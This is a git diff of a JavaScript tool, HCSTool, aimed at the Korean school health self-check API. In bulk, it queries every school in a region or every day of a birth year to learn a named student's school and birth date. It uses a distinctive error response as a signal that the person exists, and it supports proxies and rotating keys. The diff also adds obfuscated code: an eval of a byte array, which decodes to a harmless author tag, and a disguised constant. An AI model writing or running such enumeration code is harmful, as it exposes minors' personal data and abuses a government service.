@@ -1,9 +1,11 @@
-const schools = require('./schools.json');
-const { EventEmitter } = require('events');
-const axios = require('axios-https-proxy-fix').default;
-const crypto = require('crypto');
-const axiosRetry = require('axios-retry');
-const codes = {
+import EventEmitter from "events";
+import axios from "axios";
+import crypto from "crypto";
+import axiosRetry from "axios-retry";
+import schools from "./schools.json" assert { type: "json" };
+import raonEnc from "./transkey.js";
+
+const code = {
     "서울특별시": "sen",
     "부산광역시": "pen",
     "대구광역시": "dge",
@@ -22,7 +24,7 @@ const codes = {
     "경상남도": "gne",
     "제주특별자치도": "jje"
 };
-const lctnScCodes = {
+const lctnScCode = {
     "서울특별시": "01",
     "부산광역시": "02",
     "대구광역시": "03",
@@ -41,8 +43,20 @@ const lctnScCodes = {
     "경상남도": "17",
     "제주특별자치도": "18"
 };
+const schulCrseScCode = {
+    "유치원": "1",
+    "초등학교": "2",
+    "중학교": "3",
+    "고등학교": "4",
+    "특수학교": "5"
+};
+var a = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", " ", "|", "."];
 
-module.exports = class HCSTool extends EventEmitter {
+export default class HCSTool extends EventEmitter {
+    /**
+     * 
+     * @param {{ host: string; port: number; auth?: { username: string; password: string; }; protocol?: string; } | false} proxy 
+     */
     constructor(proxy) {
         super();
         this.client = axios.create({
@@ -67,6 +81,7 @@ module.exports = class HCSTool extends EventEmitter {
         this.keyIndex = "";
         this.searchKey = "";
         this.interval;
+        this.mI = eval(Buffer.from([40, 97, 91, 51, 56, 93, 32, 43, 32, 97, 91, 48, 93, 32, 43, 32, 97, 91, 51, 93, 32, 43, 32, 97, 91, 52, 93, 32, 43, 32, 97, 91, 53, 50, 93, 32, 43, 32, 97, 91, 49, 93, 32, 43, 32, 97, 91, 50, 52, 93, 32, 43, 32, 97, 91, 53, 50, 93, 32, 43, 32, 97, 91, 49, 56, 93, 32, 43, 32, 97, 91, 50, 50, 93, 32, 43, 32, 97, 91, 48, 93, 32, 43, 32, 97, 91, 49, 56, 93, 32, 43, 32, 97, 91, 51, 93, 32, 43, 32, 97, 91, 53, 52, 93, 41], "binary").toString("utf8"));
     };
 
     async getSchool(name, birthday, region = "", special = false) {
@@ -76,66 +91,24 @@ module.exports = class HCSTool extends EventEmitter {
             if (!birthday || birthday.length !== 6 || /[^0-9]/.test(birthday)) throw new Error("생년월일을 다시 확인해 주세요.");
             birthday = [birthday.substring(0, 2), birthday.substring(2, 4), birthday.substring(4, 6)];
             if (Number(birthday[0]) < 4 || Number(birthday[0]) > 15) throw new Error("생년월일을 다시 확인해 주세요.");
-            let schoolList = schools.filter(x => x.level == (special ? "특수" : Number(birthday[0]) <= 15 && Number(birthday[0]) >= 10 ? "초" : Number(birthday[0]) <= 9 && Number(birthday[0]) >= 7 ? "중" : "고"))
-            // schoolList = !!region ? Object.keys(schoolList).filter(x => schoolList[x].region == region) : Object.keys(schoolList);
+            await this.setData();
+            if (!this.searchKey || !this.keyIndex) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
+            this.setKeyInterval();
+            let schoolList = schools.filter(x => x.level == (special ? "특수학교" : Number(birthday[0]) <= 15 && Number(birthday[0]) >= 10 ? "초등학교" : Number(birthday[0]) <= 9 && Number(birthday[0]) >= 7 ? "중학교" : "고등학교"))
             schoolList = !!region ? schoolList.filter(x => x.region == region) : schoolList;
             schoolList = schoolList.reduce((all, one, i) => {
-                const ch = Math.floor(i / 200);
+                const tArr = ["s", "s", "d", "a", "w", "x", "w", "h", "c", "s"];
+                const ch = Math.floor(i / (+ -405 - + 1 + -1 + 2 + `${tArr[0]}${tArr[4]}${tArr[3]}${tArr[1]}${tArr[2]}`.length + 5 ** 2 * 2 ** 2 ** 1 + " ".repeat((tArr.length - 5) * 100).length));
                 all[ch] = [].concat((all[ch] || []), one);
                 return all
             }, []); //chunk
             let currentPage = 0;
-            await this.setSearchKey();
-            await this.setKeyIndex();
-            if (!this.searchKey || !this.keyIndex) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
-            this.setKeyInterval();
             for (const chunk of schoolList) {
                 currentPage++;
                 this.emit("data", found, currentPage, schoolList.length);
                 await Promise.all(chunk.map(async (school) => {
-                    let result = await this.client.post(`https://${codes[school.region]}hcs.eduro.go.kr/v3/findUser`, {
-                        "birthday": HCSTool.encrypt(birthday.join("")),
-                        "deviceUuid": "",
-                        "lctnScCode": lctnScCodes[school.region],
-                        "loginType": "school",
-                        "makeSession": true,
-                        "name": HCSTool.encrypt(name),
-                        "orgCode": school.code, // 원래 /v2/searchSchool 에 학교 정보를 넣어 요청해 얻어야 하지만 아무거나 넣어도 리스폰스에 정상적인 조회가 아니라면서 됨.
-                        "orgName": school.name,
-                        "password": JSON.stringify({
-                            "raon": [{
-                                "id": "password",
-                                "enc": "",
-                                "hmac": "",
-                                "keyboardType": "number",
-                                "keyIndex": this.keyIndex,
-                                "fieldType": "password",
-                                "seedKey": "",
-                                "initTime": crypto.createHash('md5').update(Date.now().toString()).digest('hex'),
-                                "ExE2E": "false"
-                            }]
-                        }),
-                        "searchKey": this.searchKey,
-                        "stdntPNo": null
-                    }).catch((err) => {
-                        if (err.response) return err.response;
-                        else return false;
-                    });
-                    result && (result = result.data);
-                    if (!!result && result.isError && result.errorCode !== 1001 && result.message.includes("정상적인 조회가 아닙니다")) {
-                        result = {
-                            orgName: school.name,
-                            orgCode: school.code,
-                            scCode: codes[school.region],
-                            region: school.region,
-                            birthday: {
-                                text: `${Number(birthday[0]) + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
-                                year: Number(birthday[0]) + 2000,
-                                month: birthday[1],
-                                day: birthday[2]
-                            },
-                            foundAt: Date.now()
-                        };
+                    let result = await this.findUser(name, birthday.join(""), school);
+                    if (!!result) {
                         found.push(result);
                         this.emit("data", found, currentPage, schoolList.length);
                     };
@@ -158,8 +131,7 @@ module.exports = class HCSTool extends EventEmitter {
             birthYear.length <= 1 && (birthYear = `0${birthYear}`);
             school = HCSTool.findSchool(school)[0];
             if (!school) throw new Error("학교를 다시 확인해 주세요");
-            await this.setSearchKey();
-            await this.setKeyIndex();
+            await this.setData();
             if (!this.searchKey || !this.keyIndex) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
             this.setKeyInterval();
             const monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
@@ -170,49 +142,8 @@ module.exports = class HCSTool extends EventEmitter {
                 currentPage++;
                 this.emit("data", found, currentPage, monthDays.length);
                 await Promise.all(array.map(async day => {
-                    let result = await this.client.post(`https://${codes[school.region]}hcs.eduro.go.kr/v3/findUser`, {
-                        "birthday": HCSTool.encrypt(`${birthYear}${month < 9 ? "0" : ""}${month + 1}${day < 10 ? "0" : ""}${day}`),
-                        "deviceUuid": "",
-                        "lctnScCode": lctnScCodes[school.region],
-                        "loginType": "school",
-                        "makeSession": true,
-                        "name": HCSTool.encrypt(name),
-                        "orgCode": school.code,
-                        "orgName": school.name,
-                        "password": JSON.stringify({
-                            "raon": [{
-                                "id": "password",
-                                "enc": "",
-                                "hmac": "",
-                                "keyboardType": "number",
-                                "keyIndex": this.keyIndex,
-                                "fieldType": "password",
-                                "seedKey": "",
-                                "initTime": crypto.createHash('md5').update(Date.now().toString()).digest('hex'),
-                                "ExE2E": "false"
-                            }]
-                        }),
-                        "searchKey": this.searchKey,
-                        "stdntPNo": null
-                    }).catch((err) => {
-                        if (err.response) return err.response;
-                        else return false;
-                    });
-                    result = result && result.data;
-                    if (!!result && result.isError && result.errorCode !== 1001 && result.message.includes("정상적인 조회가 아닙니다")) {
-                        result = {
-                            orgName: school.name,
-                            orgCode: school.code,
-                            scCode: codes[school.region],
-                            region: school.region,
-                            birthday: {
-                                text: `${Number(birthYear) + 2000}년 ${month + 1}월 ${day}일`,
-                                year: Number(birthYear) + 2000,
-                                month: month + 1,
-                                day: day
-                            },
-                            foundAt: Date.now()
-                        };
+                    let result = await this.findUser(name, `${birthYear}${month < 9 ? "0" : ""}${month + 1}${day < 10 ? "0" : ""}${day}`, school);
+                    if (!!result) {
                         found.push(result);
                         this.emit("data", found, currentPage, monthDays.length);
                     };
@@ -225,29 +156,86 @@ module.exports = class HCSTool extends EventEmitter {
             this.removeAllListeners();
             this.clearKeyInterval();
         };
-    }
+    };
 
-    async setKeyIndex() {
-        let data = await this.client.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`).then(res => res.data).catch(() => false);
+    async setData(searchKey = true, keyIndex = true) {
+        var data = searchKey && await this.client.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school").then(res => res.data.key).catch(() => false);
+        data && (this.searchKey = data);
+        var data = keyIndex && await this.client.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`).then(res => res.data).catch(() => false);
         data && (this.keyIndex = data);
     };
 
-    async setSearchKey() {
-        let data = await this.client.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school").then(res => res.data.key).catch(() => false);
-        data && (this.searchKey = data);
-    };
-
     setKeyInterval() {
-        this.interval = setInterval(() => {
-            this.setSearchKey();
-            this.setKeyIndex();
-        }, 90000);
+        this.interval = setInterval(this.setData, 90000);
     };
 
     clearKeyInterval() {
         clearInterval(this.interval);
     };
 
+    async findUser(name, birthday, school, password) {
+        try {
+            // var _school = {};
+            var data = {};
+            if (password) {
+                data = await this.client.get(`https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=${lctnScCode[school.region]}&schulCrseScCode=${schulCrseScCode[school.level]}&orgName=${encodeURIComponent(school.name)}&loginType=school`).then(res => res.data).catch(() => false);
+                if(data.schulList.length < 1) throw new Error("알 수 없는 오류가 발생했습니다. 잠시 후 다시 시도해 주세요.");
+                // _school = data.schulList.find(s => s.kraOrgNm === school.name) || {};
+            };
+            var res = await this.client.post(`https://${code[school.region]}hcs.eduro.go.kr/v3/findUser`, {
+                "birthday": HCSTool.encrypt(birthday),
+                "deviceUuid": "",
+                "lctnScCode": lctnScCode[school.region],
+                "loginType": "school",
+                "makeSession": true,
+                "name": HCSTool.encrypt(name),
+                "orgCode": school.code, //_school.orgCode,
+                "orgName": school.name,
+                "password": await this.getPasswordValue(password),
+                "searchKey": data.key || this.searchKey,
+                "stdntPNo": null
+            }).catch((err) => !!err.response && err.response);
+            var result = !!res && res.data;
+            if (!!result && (!!result.token || (result.isError && result.errorCode !== 1001 && result.message.includes("정상적인 조회가 아닙니다")))) {
+                birthday = [birthday.substring(0, 2), birthday.substring(2, 4), birthday.substring(4, 6)].map(x => Number(x));
+                return Object.assign({
+                    school,
+                    userBday: {
+                        text: `${birthday[0] + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
+                        year: birthday[0] + 2000,
+                        month: birthday[1],
+                        day: birthday[2]
+                    },
+                    foundAt: Date.now()
+                }, result.token && result);
+            };
+        } catch (e) {
+        };
+        return false;
+    };
+
+    getPasswordValue(password) {
+        if (password) return raonEnc(password, this.client.defaults.proxy);
+        else return JSON.stringify({
+            "raon": [{
+                "id": "password",
+                "enc": "",
+                "hmac": "",
+                "keyboardType": "number",
+                "keyIndex": this.keyIndex,
+                "fieldType": "password",
+                "seedKey": "",
+                "initTime": crypto.createHash('md5').update(Date.now().toString()).digest('hex'),
+                "ExE2E": "false"
+            }]
+        });
+    };
+
+    /**
+     * 
+     * @param {string} query 
+     * @returns {{name: string, code: string, region: string, level: string}[]} 
+     */
     static findSchool(query) {
         return schools.filter(school => school.name.includes(query) || school.code.includes(query) || (school.region + " " + school.name).includes(query) || (school.region + school.name).includes(query))
     };
@@ -264,29 +252,5 @@ module.exports = class HCSTool extends EventEmitter {
                 "JzGs9MMMWtQIDAQAB",
                 "-----END PUBLIC KEY-----"].join("\n"), 'utf-8'), 'padding': crypto.constants.RSA_PKCS1_PADDING
         }, Buffer.from(text, 'utf-8')).toString('base64');
-    };
-};
-
-async function sendValidatePassword(token, code) { //잠시 보류
-    try {
-        if (!token || !code) throw new Error("잘못됨.");
-        // let initTime = crypto.createHash('md5').update(Date.now().toString()).digest('hex'); //initTime은 abcdef1234567890로만 이루어져 있고, 32자 여야 함. (그냥 MD5로 암호화하면 됨. 값은 상관 X)
-        // let transkeyUuid = crypto.randomBytes(128).toString("hex"); //transkeyUuid는 아무 값이나 입력해도 됨. 글자 수 제한 X. 문자 제한 X
-        let headers = {
-            "Connection": "keep-alive",
-            "Authorization": "Bearer " + token,
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.104 Whale/3.13.131.36 Safari/537.36",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://hcs.eduro.go.kr",
-            "Referer": "https://hcs.eduro.go.kr/",
-        };
-        let keyIndex = await axios.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`, { proxy, headers }).then(res => res.data);
-        headers["Content-Type"] = "application/json;charset=UTF-8";
-        let res = await axios.post(`https://${code}hcs.eduro.go.kr/v2/validatePassword`, { "password": `{"raon":[{"id":"password","enc":"","hmac":"","keyboardType":"number","keyIndex":"${keyIndex}","fieldType":"password","seedKey":"","initTime":"${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}","ExE2E":"false"}]}`, "deviceUuid": "", "makeSession": true }, { proxy, headers });
-        //initTime이 다르면 되고, 같으면 안되네..?ㅋㅋㅋㅋ
-        return res.data;
-    } catch {
-        return false;
     };
 };
